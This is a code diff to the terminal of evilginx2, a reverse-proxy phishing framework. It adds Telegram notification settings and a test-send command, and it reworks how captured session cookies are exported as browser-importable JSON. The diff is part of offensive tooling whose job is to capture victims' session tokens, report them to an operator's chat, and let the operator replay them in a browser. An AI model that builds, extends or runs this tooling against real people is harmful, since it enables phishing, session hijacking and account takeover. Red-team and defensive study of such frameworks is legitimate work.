@@ -192,8 +192,8 @@ func (t *Terminal) handleConfig(args []string) error {
 			gophishInsecure = "true"
 		}
 
-		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "autocert", "gophish admin_url", "gophish api_key", "gophish insecure", "telegram bot_token", "telegram chat_ids"}
-		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.GetTelegramBotToken(), strings.Join(t.cfg.GetTelegramChatIDs(), ",")}
+		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "autocert", "gophish admin_url", "gophish api_key", "gophish insecure", "telegram enabled", "telegram bot_token"}
+		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, strconv.FormatBool(t.cfg.GetTelegramEnabled()), t.cfg.GetTelegramBotToken()}
 		log.Printf("\n%s\n", AsRows(keys, vals))
 		return nil
 	} else if pn == 2 {
@@ -238,6 +238,18 @@ func (t *Terminal) handleConfig(args []string) error {
 				}
 				return nil
 			}
+		case "telegram":
+			switch args[1] {
+			case "test":
+				t.p.telegram.Configure(t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramChatIDs(), t.cfg.GetTelegramEnabled())
+				err := t.p.telegram.SendMessage("Test message from evilginx2")
+				if err != nil {
+					log.Error("telegram: %s", err)
+				} else {
+					log.Success("telegram: test message sent")
+				}
+				return nil
+			}
 		}
 	} else if pn == 3 {
 		switch args[0] {
@@ -273,14 +285,25 @@ func (t *Terminal) handleConfig(args []string) error {
 			case "bot_token":
 				t.cfg.SetTelegramBotToken(args[2])
 				return nil
-			case "chat_ids":
-				t.cfg.SetTelegramChatIDs(strings.Split(args[2], ","))
+			case "chat_id":
+				var chatIDs []int64
+				chatID, err := strconv.ParseInt(args[2], 10, 64)
+				if err != nil {
+					log.Error("telegram: invalid chat id: %s", err)
+					return err
+				}
+				chatIDs = append(chatIDs, chatID)
+				t.cfg.SetTelegramChatIDs(chatIDs)
 				return nil
-			case "add_chat_id":
-				t.cfg.AppendTelegramChatID(args[2])
-				return nil
-			default:
-				return fmt.Errorf("invalid telegram config option: %s (valid options: bot_token, chat_ids, add_chat_id)", args[1])
+			case "enabled":
+				switch args[2] {
+				case "true":
+					t.cfg.SetTelegramEnabled(true)
+					return nil
+				case "false":
+					t.cfg.SetTelegramEnabled(false)
+					return nil
+				}
 			}
 		}
 	}
@@ -497,7 +520,6 @@ func (t *Terminal) handleSessions(args []string) error {
 					if len(s.CookieTokens) > 0 {
 						json_tokens := t.cookieTokensToJSON(s.CookieTokens)
 						log.Printf("[ %s ]\n%s\n\n", lyellow.Sprint("cookies"), json_tokens)
-						log.Printf("%s %s %s %s%s\n\n", dgray.Sprint("(use"), cyan.Sprint("StorageAce"), dgray.Sprint("extension to import the cookies:"), white.Sprint("https://chromewebstore.google.com/detail/storageace/cpbgcbmddckpmhfbdckeolkkhkjjmplo"), dgray.Sprint(")"))
 					}
 				}
 				break
@@ -1188,6 +1210,10 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("config", []string{"gophish", "api_key"}, "gophish api_key <key>", "set up the api key for the gophish instance to communicate with")
 	h.AddSubCommand("config", []string{"gophish", "insecure"}, "gophish insecure <true|false>", "enable or disable the verification of gophish tls certificate (set to `true` if using self-signed certificate)")
 	h.AddSubCommand("config", []string{"gophish", "test"}, "gophish test", "test the gophish configuration")
+	h.AddSubCommand("config", []string{"telegram", "bot_token"}, "telegram bot_token <token>", "set the telegram bot token")
+	h.AddSubCommand("config", []string{"telegram", "chat_id"}, "telegram chat_id <chat_id>", "set the telegram chat id to send notifications to")
+	h.AddSubCommand("config", []string{"telegram", "enabled"}, "telegram enabled <true|false>", "enable or disable telegram notifications")
+	h.AddSubCommand("config", []string{"telegram", "test"}, "telegram test", "send a test message to telegram")
 
 	h.AddCommand("proxy", "general", "manage proxy configuration", "Configures proxy which will be used to proxy the connection to remote website", LAYER_TOP,
 		readline.PcItem("proxy", readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("type"), readline.PcItem("address"), readline.PcItem("port"), readline.PcItem("username"), readline.PcItem("password")))
@@ -1277,10 +1303,9 @@ func (t *Terminal) cookieTokensToJSON(tokens map[string]map[string]*database.Coo
 		ExpirationDate int64  `json:"expirationDate"`
 		Value          string `json:"value"`
 		Name           string `json:"name"`
-		HttpOnly       bool   `json:"httpOnly"`
-		HostOnly       bool   `json:"hostOnly"`
-		Secure         bool   `json:"secure"`
-		Session        bool   `json:"session"`
+		HttpOnly       bool   `json:"httpOnly,omitempty"`
+		HostOnly       bool   `json:"hostOnly,omitempty"`
+		Secure         bool   `json:"secure,omitempty"`
 	}
 
 	var cookies []*Cookie
@@ -1294,16 +1319,13 @@ func (t *Terminal) cookieTokensToJSON(tokens map[string]map[string]*database.Coo
 				Name:           k,
 				HttpOnly:       v.HttpOnly,
 				Secure:         false,
-				Session:        false,
 			}
 			if strings.Index(k, "__Host-") == 0 || strings.Index(k, "__Secure-") == 0 {
 				c.Secure = true
 			}
 			if domain[:1] == "." {
 				c.HostOnly = false
-				// c.Domain = domain[1:] - bug support no longer needed
-				// NOTE: EditThisCookie was phased out in Chrome as it did not upgrade to manifest v3. The extension had a bug that I had to support to make the exported cookies work for !hostonly cookies.
-				// Use StorageAce extension from now on: https://chromewebstore.google.com/detail/storageace/cpbgcbmddckpmhfbdckeolkkhkjjmplo
+				c.Domain = domain[1:]
 			} else {
 				c.HostOnly = true
 			}
